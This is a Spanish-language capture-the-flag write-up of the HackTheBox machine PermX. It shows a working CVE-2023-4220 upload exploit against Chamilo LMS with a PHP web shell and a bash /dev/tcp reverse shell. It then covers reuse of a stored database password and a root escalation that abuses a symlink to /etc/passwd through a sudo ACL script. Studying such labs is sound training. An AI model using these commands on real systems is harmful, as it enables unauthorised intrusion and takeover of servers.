@@ -1,0 +1,403 @@
+---
+title: "Máquina PermX"
+description: "Resolución de la máquina PermX de HackTheBox"
+tags: ["CVE-2023-4220", "Stored credentials", "sudo"]
+categories: ["HackTheBox", "Easy", "Linux"]
+logo: "/assets/writeups/permx/logo.webp"
+---
+
+En esta máquina abusaremos de una vulnerabilidad en un LMS para obtener una ejecución remota de comandos, estando dentro de la máquina encontraremos en los propios ficheros del LMS, un archivo de ajustes con una contraseña reutilizada. Finalmente escalaremos privilegios abusando de un privilegio sudo.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+# Nmap 7.95 scan initiated Sat Jul  6 15:17:33 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.129.33.140
+Nmap scan report for 10.129.33.140
+Host is up, received user-set (0.28s latency).
+Scanned at 2024-07-06 15:17:33 -04 for 192s
+Not shown: 62741 closed tcp ports (reset), 2792 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Jul  6 15:20:45 2024 -- 1 IP address (1 host up) scanned in 192.38 seconds
+```
+
+El servidor web nos redirigue a `permx.htb`, por lo que lo agregaremos a nuestro archivo de hosts:
+
+```bash
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+127.0.0.1 localhost
+
+...
+
+10.10.11.23 permx.htb
+```
+{: file="/etc/hosts" }
+
+La página web nos dice que se trata de un sitio de eLearning:
+
+![Learning](/assets/writeups/permx/1.png)
+
+Del resto no parece haber más nada de interesante en esta landing page... vamos a husmear más.
+
+## Intrusión
+
+### www-data - permx
+
+Si fuzzeamos por subdominios, encontraremos uno interesante:
+
+```bash
+❯ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.23 -fw 18 -H "Host: FUZZ.permx.htb" -mc all
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.23
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.permx.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 18
+________________________________________________
+
+www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 205ms]
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 367ms]
+```
+
+Dentro de él, solo encontraremos esta página de inicio de sesión
+
+![Login](/assets/writeups/permx/2.png)
+
+Evidentemente esto nos dice que se está utilizando el LMS conocido como Chamilo, del cual podemos buscar vulnerabilidades.
+
+Una interesante que encontraremos es la catalogada como `CVE-2023-4220`, que nos permite abusar de la funcionalidad de subida de archivos grandes para subir archivos con extensión PHP y obtener un RCE sin autenticación alguna...
+
+Bien, el primer requisito para explotar esto es que la carpeta `files` exista en el directorio `/main/inc/lib/javascript/bigupload/` del servidor, que si existe y podemos comprobarlo simplemente colocando esa ruta en el navegador y viendo las rutas que nos muestra el indexado de directorios de Apache. Ahora necesitaremos un archivo PHP para subir, yo usaré este:
+
+```php
+<?php
+  echo system($_GET['uwu']);
+?>
+```
+
+Haciéndole una petición POST ahora al archivo `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` con el parámetro url `action` puesto en `post-unsupported` y nuestro archivo en los datos de la petición en el formato [form-data](https://reqbin.com/req/c-sma2qrvp/curl-post-form-example) dentro del campo `bigUploadFile`, nos dirá que el archivo se ha subido correctamente.
+
+```bash
+❯ curl -v -F "bigUploadFile=@test.php" "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
+* Host lms.permx.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.23
+*   Trying 10.10.11.23:80...
+* Connected to lms.permx.htb () port 80
+> POST /main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported HTTP/1.1
+> Host: lms.permx.htb
+> User-Agent: curl/8.10.0
+> Accept: */*
+> Content-Length: 259
+> Content-Type: multipart/form-data; boundary=------------------------zjjWfku77d5YxQDJRShYti
+> 
+* upload completely sent off: 259 bytes
+< HTTP/1.1 200 OK
+< Date: Fri, 01 Nov 2024 23:14:49 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Set-Cookie: ch_sid=i8j4vo9t94oi8kr9o9ik8356bm; path=/; HttpOnly
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Content-Length: 40
+< Content-Type: text/html; charset=UTF-8
+< 
+* Connection #0 to host lms.permx.htb left intact
+The file has successfully been uploaded
+```
+
+Dentro de la carpeta `files` vista anteriormente, podremos encontrar el fichero subido y su contenido PHP será procesado como podemos ver:
+
+```bash
+❯ curl -v "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/test.php?uwu=id"
+* Host lms.permx.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.23
+*   Trying 10.10.11.23:80...
+* Connected to lms.permx.htb () port 80
+> GET /main/inc/lib/javascript/bigupload/files/test.php?uwu=id HTTP/1.1
+> Host: lms.permx.htb
+> User-Agent: curl/8.10.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Fri, 01 Nov 2024 23:15:57 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Vary: Accept-Encoding
+< Content-Length: 107
+< Content-Type: text/html; charset=UTF-8
+< 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+* Connection #0 to host lms.permx.htb left intact
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Ahora podemos lanzarnos una reverse-shell simplemente enviado en la URL `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/test.php?uwu=bash%20-c%20'bash%20-i%20>%26/dev/tcp/10.10.14.188/443%200>%261`
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.23 45734
+bash: cannot set terminal process group (1174): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ script /dev/null -c bash 
+# Inicia un nuevo proceso, alocando una tty nueva.
+Script started, output log file is '/dev/null'.
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ^Z # CTRL + Z
+[1]  + 22379 suspended  nc -lvnp 443
+❯ stty raw -echo; fg  # Pasar controles de la terminal.
+[1]  + 22379 continued  nc -lvnp 443 
+                                reset xterm   # Reiniciar terminal.
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ stty rows 34 columns 149 # Ajustar filas y columnas.
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ export TERM=xterm-256color # Exportar tipo de terminal.
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ source /etc/skel/.bashrc # Darle colores a la terminal.
+```
+
+### mtz - permx
+
+Dentro de los archivos de Chamilo encontraremos unos que parecen ser jugosos:
+
+```bash
+www-data@permx:/var/www/chamilo$ ls -la
+total 1640
+drwxr-xr-x 12 www-data www-data   4096 Nov  1 18:55 .
+drwxr-xr-x  4 root     root       4096 Jun  7 14:39 ..
+-rwxr-xr-x  1 www-data www-data     46 Aug 31  2023 .bowerrc
+-rwxr-xr-x  1 www-data www-data   2545 Aug 31  2023 .codeclimate.yml
+-rwxr-xr-x  1 www-data www-data   6054 Aug 31  2023 .htaccess
+-rwxr-xr-x  1 www-data www-data   3021 Aug 31  2023 .php-cs-fixer.dist.php
+-rwxr-xr-x  1 www-data www-data     62 Aug 31  2023 .php-cs-fixer.php
+-rwxr-xr-x  1 www-data www-data   2610 Aug 31  2023 .scrutinizer.yml
+-rwxr-xr-x  1 www-data www-data   4260 Aug 31  2023 .travis.yml
+-rwxr-xr-x  1 www-data www-data   3348 Aug 31  2023 CODE_OF_CONDUCT.md
+-rwxr-xr-x  1 www-data www-data   5627 Aug 31  2023 CONTRIBUTING.md
+-rwxr-xr-x  1 www-data www-data  35147 Aug 31  2023 LICENSE
+-rwxr-xr-x  1 www-data www-data   8074 Aug 31  2023 README.md
+drwxr-xr-x 11 www-data www-data   4096 Aug 31  2023 app
+-rwxr-xr-x  1 www-data www-data   4034 Aug 31  2023 apple-touch-icon.png
+drwxr-xr-x  2 www-data www-data   4096 Aug 31  2023 bin
+-rwxr-xr-x  1 www-data www-data   1140 Aug 31  2023 bower.json
+drwxr-xr-x  2 www-data www-data   4096 Aug 31  2023 certificates
+-rwxr-xr-x  1 www-data www-data   1195 Aug 31  2023 cli-config.php
+-rwxr-xr-x  1 www-data www-data   1715 Aug 31  2023 codesize.xml
+-rwxr-xr-x  1 www-data www-data   7006 Aug 31  2023 composer.json
+-rwxr-xr-x  1 www-data www-data 601063 Aug 31  2023 composer.lock
+drwxr-xr-x  4 www-data www-data   4096 Aug 31  2023 custompages
+drwxr-xr-x  2 www-data www-data   4096 Aug 31  2023 documentation
+-rwxr-xr-x  1 www-data www-data   2462 Aug 31  2023 favicon.ico
+-rwxr-xr-x  1 www-data www-data   1225 Aug 31  2023 favicon.png
+-rwxr-xr-x  1 www-data www-data   8990 Aug 31  2023 index.php
+-rwxr-xr-x  1 www-data www-data   1614 Aug 31  2023 license.txt
+-rwxrwxrwx  1 www-data www-data 827739 Oct 11 01:13 linpeas.sh
+drwxr-xr-x 60 www-data www-data   4096 Aug 31  2023 main
+-rwxr-xr-x  1 www-data www-data    893 Aug 31  2023 news_list.php
+drwxr-xr-x 80 www-data www-data   4096 Aug 31  2023 plugin
+-rwxr-xr-x  1 www-data www-data    748 Aug 31  2023 robots.txt
+drwxr-xr-x  3 www-data www-data   4096 Aug 31  2023 src
+-rwxrwxrwx  1 www-data www-data   1472 Nov  1 18:53 sudo.sh
+-rwxr-xr-x  1 www-data www-data   1314 Aug 31  2023 terms.php
+-rwxr-xr-x  1 www-data www-data   1151 Aug 31  2023 user.php
+-rwxr-xr-x  1 www-data www-data  13279 Aug 31  2023 user_portal.php
+drwxr-xr-x 84 www-data www-data   4096 Aug 31  2023 vendor
+drwxr-xr-x  5 www-data www-data   4096 Jan 20  2024 web
+-rwxr-xr-x  1 www-data www-data   5780 Aug 31  2023 web.config
+-rwxr-xr-x  1 www-data www-data   2031 Aug 31  2023 whoisonline.php
+-rwxr-xr-x  1 www-data www-data   4037 Aug 31  2023 whoisonlinesession.php
+```
+
+En `app/config/configuration.php` está lo siguiente que parece ser interesante:
+
+```bash
+www-data@permx:/var/www/chamilo/app/config$ cat configuration.php | head -n 50
+<?php
+// Chamilo version 1.11.24
+// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
+/* For licensing terms, see /license.txt */
+/**
+ * This file contains a list of variables that can be modified by the campus site's server administrator.
+ * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
+ * If you changed some settings and want to restore them, please have a look at
+ * configuration.dist.php. That file is an exact copy of the config file at install time.
+ * Besides the $_configuration, a $_settings array also exists, that
+ * contains variables that can be changed and will not break the platform.
+ * These optional settings are defined in the database, now
+ * (table settings_current).
+ */
+
+// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;
+... [snip]
+```
+
+En la carpeta `/home/` vemos que hay un usuario:
+
+```bash
+www-data@permx:/var/www/chamilo/app/config$ ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Jan 20  2024 .
+drwxr-xr-x 18 root root 4096 Jul  1 13:05 ..
+drwxr-x---  6 mtz  mtz  4096 Nov  1 20:08 mtz
+```
+
+Si probamos a utilizar esta contraseña que encontramos con este usuario, accederemos como él:
+
+```bash
+www-data@permx:/var/www/chamilo/app/config$ su mtz
+Password: 
+mtz@permx:/var/www/chamilo/app/config$
+```
+
+En su carpeta personal podremos encontrar la primera flag:
+
+```bash
+mtz@permx:~$ ls -la
+total 860
+drwxr-x---  6 mtz  mtz    4096 Nov  1 20:08 .
+drwxr-xr-x  3 root root   4096 Jan 20  2024 ..
+lrwxrwxrwx  1 root root      9 Jan 20  2024 .bash_history -> /dev/null
+-rw-r--r--  1 mtz  mtz     220 Jan  6  2022 .bash_logout
+-rw-r--r--  1 mtz  mtz    3771 Jan  6  2022 .bashrc
+drwx------  2 mtz  mtz    4096 May 31 11:14 .cache
+drwx------  3 mtz  mtz    4096 Nov  1 17:09 .gnupg
+-rw-------  1 mtz  mtz      20 Nov  1 17:56 .lesshst
+drwxrwxr-x  3 mtz  mtz    4096 Nov  1 17:48 .local
+lrwxrwxrwx  1 root root      9 Jan 20  2024 .mysql_history -> /dev/null
+-rw-r--r--  1 mtz  mtz     807 Jan  6  2022 .profile
+drwx------  2 mtz  mtz    4096 Jan 20  2024 .ssh
+-rw-r-----  1 root mtz      33 Nov  1 10:02 user.txt
+mtz@permx:~$ cat user.txt
+8ebbe304d0ef71dcb616ab1265******
+```
+
+## Escalada de privilegios
+
+Tenemos un privilegio asignado en sudo:
+
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
+
+El script de bash contiene lo siguiente:
+
+```bash
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+```
+{: file="/opt/acl.sh" }
+
+Bien, nos permite alterar los bits de permisos de los archivos solamente en nuestro directorio personal, pero por ningún lado se puede apreciar que esté verificando por enlaces simbólicos; por lo que prácticamente podemos darnos permisos a nosotros mismos sobre cualquier archivo del sistema; podemos editar archivos jugosos como el `/etc/passwd/` o el `/etc/sudoers` para ganar acceso como root. En mi caso iré por la primera opción.
+
+Creando un enlace simbólico y dándonos permisos en el fichero en cuestión, lo alterará como es de esperar y ahora podremos editarlo:
+
+```bash
+mtz@permx:~$ ln -sf /etc/passwd uwu
+mtz@permx:~$ ls -la uwu
+lrwxrwxrwx 1 mtz mtz 11 Nov  2 20:33 uwu -> /etc/passwd
+mtz@permx:~$ sudo /opt/acl.sh mtz 7 /home/mtz/uwu
+mtz@permx:~$ ls -la /etc/passwd
+-rw-rwxr--+ 1 root root 1880 Nov  2 20:33 /etc/passwd
+```
+
+Ahora podemos simplemente colocarle una contraseña a root generada por nosotros:
+
+```bash
+# Aquí le he colocado de contraseña "uwuowo".
+mtz@permx:~$ cat /etc/passwd
+root:$1$wjKdeS4V$X6obydCrEpbG3uHewgKo7/:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+... [snip]
+mtz@permx:~$ su root
+Password: 
+root@permx:/home/mtz#
+```
+
+Con esto ya podremos tomar la última flag sin problemas.
+
+```bash
+root@permx:/home/mtz# cd /root
+root@permx:~# ls -la
+total 44
+drwx------  7 root root 4096 Nov  2 17:53 .
+drwxr-xr-x 18 root root 4096 Jul  1 13:05 ..
+drwxr-xr-x  2 root root 4096 Jun  5 12:25 backup
+lrwxrwxrwx  1 root root    9 Jan 20  2024 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 May 31 11:05 .cache
+drwx------  3 root root 4096 Nov  2 17:53 .config
+drwxr-xr-x  3 root root 4096 May 31 11:06 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rwxr-xr-x  1 root root  354 Jun  6 05:25 reset.sh
+-rw-r-----  1 root root   33 Nov  2 16:46 root.txt
+drwx------  2 root root 4096 Jun  5 12:28 .ssh
+root@permx:~# cat root.txt
+60be38a474cca81a37673ff795******
+```
